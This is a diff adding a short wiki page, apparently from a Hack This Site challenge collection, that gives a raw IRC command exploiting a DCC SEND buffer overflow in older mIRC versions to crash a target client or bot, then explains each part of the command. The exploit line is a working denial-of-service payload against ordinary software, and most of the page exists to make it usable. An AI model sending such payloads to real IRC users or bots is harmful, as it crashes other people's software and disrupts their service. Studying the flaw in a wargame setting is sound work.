@@ -1,0 +1,16 @@
+This may or may not work, depending on your operating system, browser,
+and IRC client.
+
+    /raw PRIVMSG moo :�DCC SEND "a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a" 1370673706 3500 4
+
+This exploits a flaw in older versions of mIRC where a buffer overflow
+in a DCC SEND command will cause the client (and therefore the bot
+script) to crash. "/raw" tells your client to send this raw string
+instead of formatting it as you saying something, etc. "PRIVMSG moo"
+tells the server that you are private messaging moo " :�" The space,
+colon, and 0001 unicode character are required by the IRC protocol "DCC
+SEND "..."" tells the remote client that you are trying to direct
+connect to send file "..." "1370673706 3500 4" related to the IRC
+protocol
+
+[Category:Hack This Site](Category:Hack This Site "wikilink")
